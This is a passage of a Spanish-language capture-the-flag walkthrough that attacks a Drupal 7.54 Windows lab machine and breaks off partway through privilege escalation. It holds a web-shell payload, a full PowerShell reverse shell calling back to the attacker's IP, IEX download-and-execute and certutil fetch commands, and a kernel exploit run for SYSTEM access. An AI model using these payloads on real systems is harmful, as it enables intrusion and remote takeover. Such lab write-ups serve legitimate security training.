&lt;p&gt;Podemos ver varias vulnerabilidades asociadas a la versión que corresponden a &lt;code&gt;RCE (ejecucion remota de comandos)&lt;/code&gt;.Usaremos el primer &lt;code&gt;exploit&lt;/code&gt; que corresponde a uno en &lt;code&gt;php&lt;/code&gt;, para ello vamos a proceder a traernoslo a nuestro directorio de trabajo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit -x php/webapps/41564.php
❯ ls
 41564.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Este &lt;code&gt;exploit&lt;/code&gt; aprovecha una inyeccion &lt;code&gt;sql&lt;/code&gt; para obtener la cache del endpoint y credenciales de administrador en hash, para despues tratar de subir un archivo &lt;code&gt;php&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;# Initialization

error_reporting(E_ALL);

define('QID', 'anything');
define('TYPE_PHP', 'application/vnd.php.serialized');
define('TYPE_JSON', 'application/json');
define('CONTROLLER', 'user');
define('ACTION', 'login');

$url = 'http://vmweb.lan/drupal-7.54';
$endpoint_path = '/rest_endpoint';
$endpoint = 'rest_endpoint';

$file = [
    'filename' =&amp;gt; 'dixuSOspsOUU.php',
    'data' =&amp;gt; '&amp;lt;?php eval(file_get_contents(\'php://input\')); ?&amp;gt;'
];

$browser = new Browser($url . $endpoint_path);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para utulizar el &lt;code&gt;exploit&lt;/code&gt;, primero debemos cambiar ciertas variables que define el &lt;code&gt;exploit&lt;/code&gt; como la &lt;code&gt;url&lt;/code&gt; y el &lt;code&gt;endpoint_path&lt;/code&gt;. En este caso debemos verificar si &lt;code&gt;rest_endpoint&lt;/code&gt; existe.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que &lt;code&gt;rest_endpoint&lt;/code&gt; no existe asi que podemos tratar usar un poco de &lt;code&gt;guesing&lt;/code&gt; y probar la ruta &lt;code&gt;rest&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Efectivamente vemos que se cambio la ruta por defecto a &lt;code&gt;rest&lt;/code&gt;, claro que de no haber acertado de esta forma, podriamos realizar un ataque de fuerza bruta para descubrir esta ruta como una manera alterna de hacerlo.&lt;/p&gt;

&lt;p&gt;Pues viendo que esta ruta si es valida tbm lo modificaremos en el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Finalmente vamos a modificar el archivo que crea por defecto, y vamos a crear uno propio. Este codigo nos permitira ejecutar comandos en la maquina victima mediante el parametro &lt;code&gt;cmd&lt;/code&gt; a traves de la función &lt;code&gt;shell_exec&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
    echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El exploit procederia a quedarnos de la siguiente manera con los cambios realizados.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;# Initialization

error_reporting(E_ALL);

define('QID', 'anything');
define('TYPE_PHP', 'application/vnd.php.serialized');
define('TYPE_JSON', 'application/json');
define('CONTROLLER', 'user');
define('ACTION', 'login');

$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' =&amp;gt; 'pwn.php',
    'data' =&amp;gt; '&amp;lt;?php echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST[\'cmd\']) . &quot;&amp;lt;/pre&amp;gt;&quot;; ?&amp;gt;'
];

$browser = new Browser($url . $endpoint_path);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora procedemos a ejecutar el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php drupal.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/pwn.php
❯ ls
 drupal.php   session.json   user.json
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;VIsualizamos que el archivo nos lo sube en la ruta principal, lo siguiente sera validar el archivo subido.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo que ahora nos quedaria hacer, es enviarnos una &lt;code&gt;revershell&lt;/code&gt; a nuestra maquina.&lt;/p&gt;

&lt;p&gt;De manera alternativa para ganar acceso vimos que antes, al ejecutar el &lt;code&gt;exploit&lt;/code&gt;, nos creo un archivo &lt;code&gt;session.json&lt;/code&gt; que contiene la sesion de usuario &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
    &quot;session_name&quot;: &quot;SESSd873f26fc11f2b7e6e4aa0f6fce59913&quot;,
    &quot;session_id&quot;: &quot;nERMEmBNPdBhSKZWnCye941RZL_zlBbAWPEuBs_0W2c&quot;,
    &quot;token&quot;: &quot;F_Tzii9LQfqeF9ekHCP4qTIGp1VYlIU0fuG2LiIfwIA&quot;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos cambiar nuestra &lt;code&gt;cookie&lt;/code&gt; de sesión de manera simple con la opción &lt;code&gt;inspeccionar&lt;/code&gt;, insertando el &lt;code&gt;session_name&lt;/code&gt; en el campo &lt;code&gt;nombre&lt;/code&gt; y el &lt;code&gt;session_id&lt;/code&gt; en &lt;code&gt;valor&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez insertados los campos recargamos la pagina y ya estariamos logeados como el usuario &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora que somos el ususario &lt;code&gt;admin&lt;/code&gt;, podriamos dirigirnos a la opción &lt;code&gt;Modules&lt;/code&gt; y activar la opción de &lt;code&gt;PHP filter&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues agregamos un nuevo contenido en &lt;code&gt;content&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a la opción &lt;code&gt;articule&lt;/code&gt; y agregamos un nombre, en el cuerpo podemos ejecutar codigo &lt;code&gt;php&lt;/code&gt;. En este caso usare un codigo &lt;code&gt;reverse shell&lt;/code&gt; en &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Puedes usar este codigo, solo necesitas cambiar la &lt;code&gt;ip&lt;/code&gt; y &lt;code&gt;puerto&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php&quot;&gt;https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Establecemos en formato el de &lt;code&gt;PHP code&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos en escucha por el puerto que configuramos en el &lt;code&gt;codigo&lt;/code&gt; en mi caso en el puerto &lt;code&gt;443&lt;/code&gt;. Finalmente seleccionamos en la opción &lt;code&gt;Preview&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y habriamos ganado acceso como el usuario &lt;code&gt;iis apppool\drupal&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49279.
SOCKET: Shell has connected! PID: 2644
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54&amp;gt;whoami
iis apppool\drupal

C:\inetpub\drupal-7.54&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como segunda forma alternativa, podemos hacer uso del exploit &lt;code&gt;drupalgeddon2&lt;/code&gt;. Podemos encontrar el exploit usando &lt;code&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit drupalgeddon2
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal &amp;lt; 7.58 / &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                  | php/webapps/44449.rb
Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                              | php/remote/44482.rb
Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                     | php/webapps/44448.py
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta hecho en &lt;code&gt;ruby&lt;/code&gt; por lo que debemos tenerlo instalado para poder ejecutarlo. Lo que conseguiremos con este exploit es ganar acceso a la maquina victima mediante &lt;code&gt;RCE&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Como requisito lo mas probable es que te pida instalar la gema &lt;code&gt;highline&lt;/code&gt;, lo cual se realiza del siguiente modo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ gem install highline
Fetching highline-2.1.0.gem
Successfully installed highline-2.1.0
Parsing documentation for highline-2.1.0
Installing ri documentation for highline-2.1.0
Done installing documentation for highline after 2 seconds
1 gem installed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Una vez instalada podemos ejecutar el exploit correctamente.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ruby drupalgeddon.rb
Usage: ruby drupalggedon2.rb &amp;lt;target&amp;gt; [--authentication] [--verbose]
Example for target that does not require authentication:
       ruby drupalgeddon2.rb https://example.com
Example for target that does require authentication:
       ruby drupalgeddon2.rb https://example.com --authentication
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo unico que le necesitamos proporcionar es el target en este caso la ip de la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ruby drupalgeddon.rb http://10.10.10.9
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[i] Target : http://10.10.10.9/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta te automatiza el proceso para ganar acceso como el usuario &lt;code&gt;nt authority\iusr&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;[*] Dropping back to direct OS commands
drupalgeddon2&amp;gt;&amp;gt; whoami
nt authority\iusr
drupalgeddon2&amp;gt;&amp;gt; ipconfig
Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.9
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{56FEC108-3F71-4327-BF45-2B4EE355CD0F}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Como tercera alternativa, tenemos el &lt;code&gt;drupalgeddon3&lt;/code&gt;, del repositorio de:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/oways/SA-CORE-2018-004&quot;&gt;https://github.com/oways/SA-CORE-2018-004&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Nos clonamos el respositorio y tenemos un script hecho el &lt;code&gt;python3&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git clone https://github.com/oways/SA-CORE-2018-004
Clonando en 'SA-CORE-2018-004'...
remote: Enumerating objects: 15, done.
remote: Total 15 (delta 0), reused 0 (delta 0), pack-reused 15
Recibiendo objetos: 100% (15/15), 106.84 KiB | 475.00 KiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
❯ cd SA-CORE-2018-004
❯ ls
 drupalgeddon3.py   example.png   README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 drupalgeddon3.py

[Usage]
python drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]

[Example]
python drupalgeddon3.py http://target/drupal/ &quot;SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0&quot; 6 &quot;uname -a&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ejecutarlo nos pide el &lt;code&gt;target&lt;/code&gt; y la &lt;code&gt;session&lt;/code&gt; que habriamos obtenido anteriormente con el primer &lt;code&gt;exploit&lt;/code&gt;, seguidamente nos pide un &lt;code&gt;nodo&lt;/code&gt; existente que lo podemos ver en la opción &lt;code&gt;content &amp;gt; find content&lt;/code&gt; y en &lt;code&gt;REST&lt;/code&gt; haciendo &lt;code&gt;hovering (pasar el mouse encima de la opción)&lt;/code&gt; vemos el numero de &lt;code&gt;nodo&lt;/code&gt; y finalmente el comando que queremos ejecutar.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 drupalgeddon3.py http://10.10.10.9 &quot;SESSd873f26fc11f2b7e6e4aa0f6fce59913=nERMEmBNPdBhSKZWnCye941RZL_zlBbAWPEuBs_0W2c&quot; 1 &quot;whoami&quot;
nt authority\iusr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El exploit funciona correctamente y esta seria la tercera forma de ganar acceso al sistema.&lt;/p&gt;

&lt;p&gt;Para ganar al sistema de manera mas comoda usare el primer metodo, para usando la herramienta &lt;code&gt;nishang&lt;/code&gt; y obtener acceso en una &lt;code&gt;powershell&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1&quot;&gt;https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para matar dos pajaros de un tiro, como es de costumbre añadiremos al final del &lt;code&gt;script&lt;/code&gt; la ejecución del comando que nos otorgue la conexión una vez este se interprete.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;function Invoke-PowerShellTcp 
{ 
    [CmdletBinding(DefaultParameterSetName=&quot;reverse&quot;)] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName=&quot;bind&quot;)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;reverse&quot;)]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName=&quot;bind&quot;)]
        [Int]
        $Port,

        [Parameter(ParameterSetName=&quot;reverse&quot;)]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName=&quot;bind&quot;)]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes(&quot;Windows PowerShell running as user &quot; + $env:username + &quot; on &quot; + $env:computername + &quot;`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n&quot;)
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '&amp;gt;')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2&amp;gt;&amp;amp;1 | Out-String )
            }
            catch
            {
                Write-Warning &quot;Something went wrong with execution of command on the target.&quot; 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '&amp;gt; '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning &quot;Something went wrong! Check if the server is reachable and you are using the correct port.&quot; 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos compartimos ahora un servicio web con &lt;code&gt;python&lt;/code&gt; y nos ponemos en escucha por el puerto &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el script mediante el archivo &lt;code&gt;pwn.php&lt;/code&gt; que subimos previamente y elecutamos &lt;code&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt; con &lt;code&gt;IEX&lt;/code&gt; para que se nos interprete.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Bastard/drupal15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Recibimos la petición&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.9 - - [29/Apr/2023 03:34:16] &quot;GET /Invoke-PowerShellTcp.ps1 HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y ganamos acceso en una &lt;code&gt;powershell&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.9.
Ncat: Connection from 10.10.10.9:49349.
Windows PowerShell running as user BASTARD$ on BASTARD
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\inetpub\drupal-7.54&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos dirigimos al directorio del usuario &lt;code&gt;dimitris&lt;/code&gt; y visiualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd Desktop
dir


    Directory: C:\Users\dimitris\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         19/3/2017   8:06 ??         32 user.txt                          


type user.txt
ba22fde1932d06eb76a163d312f921a2
PS C:\Users\dimitris\Desktop&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Logramos obtener unas contraseñas en texto claro.&lt;/p&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Usaremos &lt;code&gt;sherlock.ps1&lt;/code&gt; para detectar vias potenciales de escalar privilegios en el &lt;code&gt;kernel&lt;/code&gt;. esta herramienta realiza un proceso similar a herramientas como &lt;code&gt;powerview&lt;/code&gt; y &lt;code&gt;winpeas&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1&quot;&gt;https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez tengamos el &lt;code&gt;script&lt;/code&gt; si filtramos por &lt;code&gt;function&lt;/code&gt;. podemos ver distintas opciones que podemos probar.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cat Sherlock.ps1 | grep &quot;function&quot;
function Get-FileVersionInfo ($FilePath) {
function Get-InstalledSoftware($SoftwareName) {
function Get-Architecture {
function Get-CPUCoreCount {
function New-ExploitTable {
function Set-ExploitTable ($MSBulletin, $VulnStatus) {
function Get-Results {
function Find-AllVulns {
function Find-MS10015 {
function Find-MS10092 {
function Find-MS13053 {
function Find-MS13081 {
function Find-MS14058 {
function Find-MS15051 {
function Find-MS15078 {
function Find-MS16016 {
function Find-MS16032 {
function Find-MS16034 {
function Find-CVE20177199 {
function Find-MS16135 {
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Usaremos la opción &lt;code&gt;Find-AllVulns&lt;/code&gt; que me probara todas las opciones. Para ello debemos abrirnos el &lt;code&gt;script&lt;/code&gt; y en la linea final agregar &lt;code&gt;Find-AllVulns&lt;/code&gt;, que hara que al interpretarse el codigo al final llame a esa función.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;        $Build = [int]$VersionInfo[2]
        $Revision = [int]$VersionInfo[3].Split(&quot; &quot;)[0]

        switch ( $Build ) {

            7601 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -lt 23584 ] }
            9600 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -le 18524 ] }
            10240 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -le 16384 ] }
            10586 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -le 19 ] }
            14393 { $VulnStatus = @(&quot;Not Vulnerable&quot;,&quot;Appears Vulnerable&quot;)[ $Revision -le 446 ] }
            default { $VulnStatus = &quot;Not Vulnerable&quot; }

        }

    Set-ExploitTable $MSBulletin $VulnStatus

}

Find-AllVulns
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Compartimos un servicio web con &lt;code&gt;python&lt;/code&gt; nuevamente y interpretamos el script desde la maquina victima con &lt;code&gt;IEX&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;Iex(New-Object Net.WebClient).downloadString('http://10.10.16.3/Sherlock.ps1')

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que parece ser vulnerable a &lt;code&gt;MS15-051&lt;/code&gt; y para explotarlo usaremos un repositorio en github, del cual podemos descargarnos un archivo &lt;code&gt;zip&lt;/code&gt; que contiene el ejecutable.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051&quot;&gt;https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
 Source   ms15-051.exe   ms15-051x64.exe
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Procedemos a subirlo a la maquina victima, para ello usaremos &lt;code&gt;certutil&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;certutil.exe -f -urlcache -split http://10.10.16.3/ms15-051x64.exe ms15-051x64.exe
****  Online  ****
  0000  ...
  d800
CertUtil: -URLCache command completed successfully.

dir

    Directory: C:\WIndows\Temp\Priv


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         29/4/2023   7:04 ??      55296 ms15-051x64.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para ejecutarlo, simplemte debemos pasarle un comando.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;.\ms15-051x64.exe &quot;whoami&quot;
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 1760 created.
==============================
nt authority\system
PS C:\WIndows\Temp\Priv&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Seguidamente para ganar acceso como &lt;code&gt;administrator&lt;/code&gt;, descargaremos &lt;code&gt;ncat&lt;/code&gt; versión &lt;code&gt;1.12&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez lo tengamos, proceremos a subir &lt;code&gt;nc64.exe&lt;/code&gt; a la maquina victima.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ls
